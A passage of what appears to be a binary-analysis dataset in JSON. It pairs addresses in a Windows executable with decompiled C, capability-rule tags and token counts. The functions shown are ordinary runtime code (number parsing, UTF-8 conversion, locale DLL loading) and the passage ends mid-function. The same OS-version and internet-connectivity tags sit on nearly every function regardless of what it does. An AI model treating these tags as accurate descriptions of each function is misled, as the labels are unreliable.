        "decompiled_code": "\nvoid fcn.004061f0(void)\n\n{\n    if (*0x492018 != NULL) {\n        (**0x492018)();\n        return;\n    }\n    fcn.00403050();\n    return;\n}\n",
        "token_count": 47
    },
    "00406554": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00406638)\n// WARNING: Removing unreachable block (ram,0x00406727)\n// WARNING: Removing unreachable block (ram,0x0040672e)\n// WARNING: Removing unreachable block (ram,0x004066b4)\n// WARNING: Removing unreachable block (ram,0x004066ca)\n// WARNING: Removing unreachable block (ram,0x00406738)\n// WARNING: Removing unreachable block (ram,0x0040673b)\n// WARNING: Removing unreachable block (ram,0x00406741)\n// WARNING: Removing unreachable block (ram,0x004066c0)\n\nulong __fastcall fcn.00406554(uint param_1, int32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    char cVar4;\n    int32_t in_EAX;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    bool bVar9;\n    int32_t *piStack36;\n    uint32_t uStack28;\n    int32_t iStack24;\n    \n    iVar7 = 1;\n    uStack28 = 0;\n    iStack24 = 0;\n    if (in_EAX == 0) {\n        *param_2 = 1;\n        goto code_r0x0040675c;\n    }\n    for (; *(in_EAX + -1 + iVar7) == ' '; iVar7 = iVar7 + 1) {\n    }\n    bVar9 = false;\n    cVar4 = *(in_EAX + -1 + iVar7);\n    if (cVar4 == '-') {\n        bVar9 = true;\n        iVar7 = iVar7 + 1;\n    }\n    else if (cVar4 == '+') {\n        iVar7 = iVar7 + 1;\n    }\n    uVar2 = 1;\n    piStack36 = param_2;\n    if (((*(in_EAX + -1 + iVar7) == '$') || (cVar4 = fcn.004033fc(),  cVar4 == 'X')) ||\n       ((*(in_EAX + -1 + iVar7) == '0' && (cVar4 = fcn.004033fc(),  cVar4 == 'X')))) {\n        if (*(in_EAX + -1 + iVar7) == '0') {\n            iVar7 = iVar7 + 1;\n        }\n        do {\n            iVar7 = iVar7 + 1;\n            uVar1 = *(in_EAX + -1 + iVar7);\n            if (uVar1 - 0x30 < 10) {\n                uVar8 = uVar1 - 0x30;\n            }\n            else if (uVar1 + 0xbf < 6) {\n                uVar8 = uVar1 - 0x37;\n            }\n            else {\n                if (5 < uVar1 + 0x9f) goto code_r0x0040666a;\n                uVar8 = uVar1 - 0x57;\n            }\n            if (((iStack24 != 0) && (iStack24 < 0)) || ((iStack24 != 0xfffffff && (0xfffffff < iStack24))))\n            goto code_r0x0040666a;\n            uVar3 = uStack28 >> 0x1c;\n            uVar5 = uStack28 * 0x10;\n            uStack28 = uVar5 + uVar8;\n            iStack24 = (iStack24 << 4 | uVar3) + (uVar8 >> 0x1f) + CARRY4(uVar5, uVar8);\n            uVar2 = 0;\n        } while( true );\n    }\n    for (; *(in_EAX + -1 + iVar7) - 0x30U < 10; iVar7 = iVar7 + 1) {\n        uVar2 = *(in_EAX + -1 + iVar7);\n        iVar6 = fcn.0040649c();\n        piStack36 = (uVar2 - 0x30) + iVar6;\n        uVar2 = 0;\n    }\n    iStack24 = 0;\n    uStack28 = 0;\n    goto code_r0x00406742;\ncode_r0x0040666a:\n    if (bVar9) {\n        bVar9 = uStack28 != 0;\n        uStack28 = -uStack28;\n        iStack24 = -(iStack24 + bVar9);\n    }\ncode_r0x00406742:\n    if (uVar2 | *(in_EAX + -1 + iVar7) != '\\0') {\n        *piStack36 = iVar7;\n    }\n    else {\n        *piStack36 = 0;\n    }\ncode_r0x0040675c:\n    return CONCAT44(iStack24, uStack28);\n}\n",
        "token_count": 1084
    },
    "004069c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004069c8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uchar auStack272 [264];\n    \n    if (*(in_EAX + 0x10) == 0) {\n        sub.kernel32.dll_GetModuleFileNameA(*(in_EAX + 4), auStack272, 0x105);\n        iVar1 = fcn.00406c2c();\n        *(in_EAX + 0x10) = iVar1;\n        if (iVar1 == 0) {\n            *(in_EAX + 0x10) = *(in_EAX + 4);\n        }\n    }\n    return *(in_EAX + 0x10);\n}\n",
        "token_count": 154
    },
    "00406a68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar * __cdecl\nfcn.00406a68(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint arg_5ch)\n\n{\n    char *in_EAX;\n    code *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint in_EDX;\n    uint *puVar6;\n    uint lpFileName;\n    uint lpFindFileData;\n    uint lpString2;\n    int32_t hFindFile;\n    char *var_ch;\n    uint iMaxLength;\n    char *lpString1;\n    \n    var_ch = in_EAX;\n    iMaxLength = in_EDX;\n    lpString1 = in_EAX;\n    hFindFile = sub.kernel32.dll_GetModuleHandleA(0x406c08);\n    if (((hFindFile == 0) || (pcVar1 = sub.kernel32.dll_GetProcAddress(hFindFile, 0x406c18),  pcVar1 == NULL)) ||\n       (iVar2 = (*pcVar1)(lpString1, &lpFileName, 0x105),  iVar2 == 0)) {\n        if (*lpString1 == '\\\\') {\n            if (lpString1[1] != '\\\\') {\n                return var_ch;\n            }\n            pcVar3 = fcn.00406a48();\n            if (*pcVar3 == '\\0') {\n                return var_ch;\n            }\n            pcVar3 = fcn.00406a48();\n            if (*pcVar3 == '\\0') {\n                return var_ch;\n            }\n        }\n        else {\n            pcVar3 = lpString1 + 2;\n        }\n        iVar2 = pcVar3 - lpString1;\n        puVar6 = &lpFileName;\n        sub.kernel32.dll_lstrcpynA(puVar6, lpString1, iVar2 + 1);\n        while (*pcVar3 != '\\0') {\n            pcVar4 = fcn.00406a48();\n            if (0x105 < pcVar4 + (iVar2 - pcVar3) + 1) {\n                return var_ch;\n            }\n            sub.kernel32.dll_lstrcpynA(&lpFileName + iVar2, pcVar3, pcVar4 + (1 - pcVar3));\n            hFindFile = sub.kernel32.dll_FindFirstFileA(&lpFileName, &lpFindFileData);\n            if (hFindFile == -1) {\n                return var_ch;\n            }\n            sub.kernel32.dll_FindClose(hFindFile);\n            iVar5 = sub.kernel32.dll_lstrlenA(&lpString2);\n            if (0x105 < iVar5 + iVar2 + 2) {\n                return var_ch;\n            }\n            *(&lpFileName + iVar2) = 0x5c;\n            sub.kernel32.dll_lstrcpynA(&lpFileName + iVar2 + 1, &lpString2, 0x104 - iVar2);\n            puVar6 = &lpString2;\n            iVar5 = sub.kernel32.dll_lstrlenA();\n            iVar2 = iVar2 + iVar5 + 1;\n            pcVar3 = pcVar4;\n        }\n        sub.kernel32.dll_lstrcpynA(lpString1, &lpFileName, iMaxLength, puVar6);\n    }\n    else {\n        sub.kernel32.dll_lstrcpynA(lpString1, &lpFileName, iMaxLength);\n    }\n    return var_ch;\n}\n",
        "token_count": 858
    },
    "00406c2c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00406c2c(void)\n\n{\n    uint noname_0;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    char *pcVar4;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffe50;\n    uint in_stack_fffffe8c;\n    uint in_stack_fffffe90;\n    uint in_stack_fffffe94;\n    uint in_stack_fffffe98;\n    uint *in_stack_fffffe9c;\n    uint in_stack_fffffea0;\n    uint in_stack_fffffea4;\n    uint in_stack_fffffea8;\n    uint in_stack_fffffeac;\n    uint *noname_12;\n    uint uVar5;\n    uint noname_14;\n    uint noname_15;\n    uint noname_16;\n    uint noname_18;\n    uint *noname_19;\n    uint noname_20;\n    uint lpLibFileName;\n    uint var_18h;\n    uint var_12h;\n    uint var_eh;\n    uint hKey;\n    uint lpString2;\n    \n    noname_20 = 0x105;\n    noname_19 = &fcn.00406c2c::lpLibFileName;\n    noname_18 = 0;\n    sub.kernel32.dll_GetModuleFileNameA();\n    var_12h._0_1_ = '\\0';\n    puVar3 = &fcn.00406c2c::hKey;\n    noname_16 = 0xf0019;\n    noname_15 = 0;\n    noname_14 = 0x406e5c;\n    uVar5 = 0x80000001;\n    noname_12 = 0x406c6b;\n    iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n    if (iVar1 != 0) {\n        noname_12 = &fcn.00406c2c::hKey;\n        in_stack_fffffeac = 0xf0019;\n        in_stack_fffffea8 = 0;\n        in_stack_fffffea4 = 0x406e5c;\n        in_stack_fffffea0 = 0x80000002;\n        in_stack_fffffe9c = 0x406c89;\n        iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n        if (iVar1 != 0) {\n            in_stack_fffffe9c = &fcn.00406c2c::hKey;\n            in_stack_fffffe98 = 0xf0019;\n            in_stack_fffffe94 = 0;\n            in_stack_fffffe90 = 0x406e78;\n            in_stack_fffffe8c = 0x80000001;\n            iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n            if (iVar1 != 0) {\n                sub.kernel32.dll_lstrcpynA();\n                uVar5 = sub.kernel32.dll_GetThreadLocale(3, &fcn.00406c2c::var_eh + 1, 5);\n                sub.kernel32.dll_GetLocaleInfoA(uVar5);\n                iVar1 = 0;\n                if ((lpLibFileName != '\\0') && ((var_eh._1_1_ != '\\0' || (var_12h != '\\0')))) {\n                    iVar2 = sub.kernel32.dll_lstrlenA(&fcn.00406c2c::lpLibFileName);\n                    for (puVar3 = &fcn.00406c2c::lpLibFileName + iVar2;\n                        (*puVar3 != '.' && (puVar3 != &fcn.00406c2c::lpLibFileName)); puVar3 = puVar3 + -1) {\n                    }\n                    if (puVar3 != &fcn.00406c2c::lpLibFileName) {\n                        pcVar4 = puVar3 + 1;\n                        if (var_12h != '\\0') {\n                            sub.kernel32.dll_lstrcpynA\n                                      (pcVar4, &fcn.00406c2c::var_12h, 0x105 - (pcVar4 - &fcn.00406c2c::lpLibFileName));\n                            iVar1 = sub.kernel32.dll_LoadLibraryExA(&fcn.00406c2c::lpLibFileName, 0, 2);\n                        }\n                        if ((iVar1 == 0) && (var_eh._1_1_ != '\\0')) {\n                            sub.kernel32.dll_lstrcpynA\n                                      (pcVar4, &fcn.00406c2c::var_eh + 1, \n                                       0x105 - (pcVar4 - &fcn.00406c2c::lpLibFileName));\n                            iVar1 = sub.kernel32.dll_LoadLibraryExA(&fcn.00406c2c::lpLibFileName, 0, 2);\n                            if (iVar1 == 0) {\n                                var_eh._3_1_ = 0;\n                                sub.kernel32.dll_lstrcpynA\n                                          (pcVar4, &fcn.00406c2c::var_eh + 1, \n                                           0x105 - (pcVar4 - &fcn.00406c2c::lpLibFileName));\n                                iVar1 = sub.kernel32.dll_LoadLibraryExA(&fcn.00406c2c::lpLibFileName, 0, 2);\n                            }\n                        }\n                    }\n                }\n                return iVar1;\n            }\n        }\n    }\n    noname_0 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe80;\n    var_18h = 5;\n    fcn.00406a68(noname_0, 0x406d31, &stack0xfffffffc, in_stack_fffffe8c, in_stack_fffffe90, in_stack_fffffe94, \n                 in_stack_fffffe98, in_stack_fffffe9c, in_stack_fffffea0, in_stack_fffffea4, in_stack_fffffea8, \n                 in_stack_fffffeac, noname_12, uVar5, noname_14, noname_15, noname_16, puVar3, noname_18, noname_19, \n                 noname_20, unaff_ESI);\n    iVar1 = sub.advapi32.dll_RegQueryValueExA\n                      (hKey, &fcn.00406c2c::lpLibFileName, 0, 0, &fcn.00406c2c::var_12h, &fcn.00406c2c::var_18h);\n    if (iVar1 != 0) {\n        in_stack_fffffe50 = hKey;\n        iVar1 = sub.advapi32.dll_RegQueryValueExA(hKey, 0x406e98, 0, 0, &fcn.00406c2c::var_12h, &fcn.00406c2c::var_18h);\n        if (iVar1 != 0) {\n            var_12h._0_1_ = '\\0';\n        }\n    }\n    var_eh._0_1_ = 0;\n    *in_FS_OFFSET = in_stack_fffffe50;\n    iVar1 = sub.advapi32.dll_RegCloseKey(hKey, 0x406d38);\n    return iVar1;\n}\n",
        "token_count": 1615
    },
    "00406f30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00406f30(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    var_8h = *0x492044;\n    if (*0x492044 != NULL) {\n        do {\n            uStack32 = 0x406f6b;\n            uStack36 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &uStack36;\n            puStack28 = &stack0xfffffffc;\n            (*var_8h[1])();\n            *in_FS_OFFSET = uStack36;\n            var_8h = *var_8h;\n        } while (var_8h != NULL);\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "00407180": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407180(uint32_t arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint32_t in_EDX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 0;\n    if (in_ECX != 0) {\n        uVar5 = 0;\n        uVar2 = 0;\n        if (in_EAX == 0) {\n            if (arg_8h != 0) {\n                do {\n                    uVar1 = *(in_ECX + uVar2 * 2);\n                    uVar2 = uVar2 + 1;\n                    if (0x7f < uVar1) {\n                        if (0x7ff < uVar1) {\n                            uVar5 = uVar5 + 1;\n                        }\n                        uVar5 = uVar5 + 1;\n                    }\n                    uVar5 = uVar5 + 1;\n                } while (uVar2 < arg_8h);\n            }\n        }\n        else {\n            while ((uVar2 < arg_8h && (uVar5 < in_EDX))) {\n                uVar1 = *(in_ECX + uVar2 * 2);\n                uVar2 = uVar2 + 1;\n                uVar3 = uVar1;\n                if (uVar1 < 0x80) {\n                    *(in_EAX + uVar5) = uVar3;\n                    uVar5 = uVar5 + 1;\n                }\n                else if (uVar1 < 0x800) {\n                    if (in_EDX < uVar5 + 2) break;\n                    *(in_EAX + uVar5) = uVar1 >> 6 | 0xc0;\n                    *(in_EAX + 1 + uVar5) = uVar3 & 0x3f | 0x80;\n                    uVar5 = uVar5 + 2;\n                }\n                else {\n                    if (in_EDX < uVar5 + 3) break;\n                    *(in_EAX + uVar5) = uVar1 >> 0xc | 0xe0;\n                    *(in_EAX + 1 + uVar5) = uVar1 >> 6 & 0x3f | 0x80;\n                    *(in_EAX + 2 + uVar5) = uVar3 & 0x3f | 0x80;\n                    uVar5 = uVar5 + 3;\n                }\n            }\n            if (in_EDX <= uVar5) {\n                uVar5 = in_EDX - 1;\n            }\n            *(in_EAX + uVar5) = 0;\n        }\n        iVar4 = uVar5 + 1;\n    }\n    return iVar4;\n}\n",
        "token_count": 653
    },
    "0040725c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040725c(uint32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint32_t in_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_ECX == 0) {\n        var_10h = 0;\n    }\n    else {\n        uVar3 = 0;\n        uVar5 = 0;\n        if (in_EAX == 0) {\n            if (arg_8h != 0) {\n                do {\n                    uVar6 = uVar5 + 1;\n                    if ((*(in_ECX + uVar5) & 0x80) != 0) {\n                        if (arg_8h <= uVar6) {\n                            return -1;\n                        }\n                        if ((*(in_ECX + uVar5) & 0x20) != 0) {\n                            puVar1 = in_ECX + uVar6;\n                            uVar6 = uVar5 + 2;\n                            if ((*puVar1 & 0xc0) != 0x80) {\n                                return -1;\n                            }\n                            if (arg_8h <= uVar6) {\n                                return -1;\n                            }\n                        }\n                        puVar1 = in_ECX + uVar6;\n                        uVar6 = uVar6 + 1;\n                        if ((*puVar1 & 0xc0) != 0x80) {\n                            return -1;\n                        }\n                    }\n                    uVar3 = uVar3 + 1;\n                    uVar5 = uVar6;\n                } while (uVar6 < arg_8h);\n            }\n        }\n        else {\n            for (; (uVar5 < arg_8h && (uVar3 < in_EDX)); uVar3 = uVar3 + 1) {\n                uVar2 = *(in_ECX + uVar5);\n                uVar6 = uVar5 + 1;\n                if ((uVar2 & 0x80) == 0) {\n                    *(in_EAX + uVar3 * 2) = uVar2;\n                }\n                else {\n                    if (arg_8h <= uVar6) {\n                        return -1;\n                    }\n                    uVar4 = uVar2 & 0x3f;\n                    if ((uVar2 & 0x20) != 0) {\n                        puVar1 = in_ECX + uVar6;\n                        uVar6 = uVar5 + 2;\n                        if ((*puVar1 & 0xc0) != 0x80) {\n                            return -1;\n                        }\n                        if (arg_8h <= uVar6) {\n                            return -1;\n                        }\n                        uVar4 = *puVar1 & 0x3f | uVar4 << 6;\n                    }\n                    puVar1 = in_ECX + uVar6;\n                    uVar6 = uVar6 + 1;\n                    if ((*puVar1 & 0xc0) != 0x80) {\n                        return -1;\n                    }\n                    *(in_EAX + uVar3 * 2) = *puVar1 & 0x3f | uVar4 << 6;\n                }\n                uVar5 = uVar6;\n            }\n            if (in_EDX <= uVar3) {\n                uVar3 = in_EDX - 1;\n            }\n            *(in_EAX + uVar3 * 2) = 0;\n        }\n        var_10h = uVar3 + 1;\n    }\n    return var_10h;\n}\n",
        "token_count": 848
    },
    "004085dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004085dc(uint *arg_8h, uint *arg_ch)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    int32_t *in_EDX;\n    uint var_4h;\n    \n    iVar1 = sub.user32.dll_FindWindowA(0x40868c, 0x408678);\n    uVar2 = sub.user32.dll_RegisterWindowMessageA(0x408694);\n    *in_EAX = uVar2;\n    iVar3 = sub.user32.dll_RegisterWindowMessageA(0x4086a4);\n    *in_EDX = iVar3;\n    iVar3 = sub.user32.dll_RegisterWindowMessageA(0x4086bc);\n    *in_ECX = iVar3;\n    if ((*in_EDX == 0) || (iVar1 == 0)) {\n        *arg_ch = 0;\n    }\n    else {\n        uVar2 = sub.user32.dll_SendMessageA(iVar1, *in_EDX, 0, 0);\n        *arg_ch = uVar2;\n    }\n    if ((*in_ECX == 0) || (iVar1 == 0)) {\n        *arg_8h = 3;\n    }\n    else {\n        uVar2 = sub.user32.dll_SendMessageA(iVar1, *in_ECX, 0, 0);\n        *arg_8h = uVar2;\n    }\n    return iVar1;\n}\n",
        "token_count": 338
    },
    "004086d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004086d4(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x40870f;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x498800 = *0x498800 + 1;\n    if ((*0x498800 == 0) && (*0x498804 != 0)) {\n        iStack20 = *0x498804;\n        sub.kernel32.dll_FreeLibrary_1();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 170
    },
    "0040f778": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0040f778(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t unaff_EBX;\n    uint32_t uVar3;\n    bool bVar4;\n    int32_t iStack24;\n    int32_t iStack20;\n    \n    uVar3 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar1 != *(in_EAX + 0x24)) {\n        fcn.0040f734();\n        iStack20 = *(in_EAX + 0x28);\n        fcn.0040f5ac();\n        bVar4 = *(iStack24 + 0xc) != 0;\n        if (bVar4) {\n            fcn.0040f510();\n        }\n        while( true ) {\n            iVar2 = fcn.0040f530();\n            if (iVar2 == 0xffff) break;\n            iVar2 = fcn.0040f530();\n            if (iVar2 != 0) {\n                fcn.0040f768();\n            }\n        }\n        fcn.0040f734();\n        if (bVar4) {\n            fcn.0040f51c();\n        }\n        *(in_EAX + 0x24) = iVar1;\n        iVar1 = fcn.0040f510();\n        uVar3 = unaff_EBX & 0xffffff00 | iVar1 + -1 == iStack20;\n    }\n    *(in_EAX + 0x1c) = *(in_EAX + 0x1c) + 1;\n    return CONCAT44(iStack20, uVar3);\n}\n",
        "token_count": 383
    },
    "00409ee4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00409ee4(void)\n\n{\n    uint uVar1;\n    int32_t iStack20;\n    \n    uVar1 = fcn.00403ec4();\n    if (iStack20 != 0) {\n        fcn.00409774();\n    }\n    return uVar1;\n}\n",
        "token_count": 68
    },
    "00409f20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00409f20(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00403ec4();\n    if (param_1 != 0) {\n        uVar1 = param_2;\n    }\n    return CONCAT44(param_1, uVar1);\n}\n",
        "token_count": 79
    },
    "00409f38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00409f38(int32_t param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.00403ec4();\n    *param_2 = uVar1;\n    return CONCAT44(param_1, uVar1 & 0xffffff00 | param_1 == 0);\n}\n",
        "token_count": 84
    },
    "00409f58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00409f58(int32_t param_1, uint32_t *param_2)\n\n{\n    ulong uVar1;\n    \n    uVar1 = fcn.00406554();\n    *param_2 = uVar1;\n    param_2[1] = uVar1 >> 0x20;\n    return CONCAT44(param_1, uVar1 & 0xffffff00 | param_1 == 0);\n}\n",
        "token_count": 98
    },
    "0040a870": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0040a870(void)\n\n{\n    ushort uVar1;\n    char *in_EAX;\n    ushort *puVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    \n    if (*in_EAX == '\\0') {\n        return 0;\n    }\n    puVar2 = in_EAX + 1 & 0xfffffffe;\n    while( true ) {\n        do {\n            uVar1 = *puVar2;\n            puVar2 = puVar2 + 1;\n            uVar3 = uVar1;\n            uVar4 = uVar1 >> 8;\n        } while ((uVar3 & uVar4) != 0);\n        if (uVar3 == 0) break;\n        if (uVar4 == 0) {\n            return -in_EAX + -1 + puVar2;\n        }\n    }\n    return -in_EAX + -2 + puVar2;\n}\n",
        "token_count": 210
    },
    "0040ab78": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040ab78(void)\n\n{\n    if (**0x495cd4 != NULL) {\n        (***0x495cd4)();\n        return;\n    }\n    fcn.00403050();\n    return;\n}\n",
        "token_count": 50
    },
    "0040aba8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040ac77)\n\nvoid __cdecl fcn.0040aba8(uint noname_0, uint noname_1, int32_t arg_10h)\n\n{\n    char cVar1;\n    char cVar2;\n    char *in_EAX;\n    char *in_ECX;\n    char *pcVar3;\n    char *extraout_ECX;\n    char *extraout_ECX_00;\n    char *extraout_ECX_01;\n    char *pcVar4;\n    int32_t in_EDX;\n    char *extraout_EDX;\n    char *extraout_EDX_00;\n    char *pcVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint unaff_ESI;\n    char *pcVar8;\n    uint unaff_EDI;\n    bool bVar9;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar3 = in_ECX + arg_10h;\ncode_r0x0040abd1:\n    pcVar4 = in_ECX;\n    if (in_EDX != 0) {\n        do {\n            if (pcVar4 == pcVar3) break;\n            pcVar5 = pcVar4 + 1;\n            cVar1 = *pcVar4;\n            pcVar7 = pcVar5;\n            if (cVar1 == '%') {\n                if (pcVar5 == pcVar3) break;\n                pcVar7 = pcVar4 + 2;\n                cVar1 = *pcVar5;\n                if (cVar1 != '%') goto code_r0x0040abfb;\n            }\n            *in_EAX = cVar1;\n            in_EDX = in_EDX + -1;\n            pcVar4 = pcVar7;\n            in_EAX = in_EAX + 1;\n            if (in_EDX == 0) break;\n        } while( true );\n    }\ncode_r0x0040af0f:\n    fcn.0040aeff();\n    return;\ncode_r0x0040abfb:\n    in_ECX = pcVar7;\n    if (cVar1 == '-') {\n        if (pcVar7 == pcVar3) goto code_r0x0040af0f;\n        in_ECX = pcVar7 + 1;\n    }\n    cVar2 = fcn.0040ac8a(unaff_EDI, unaff_ESI);\n    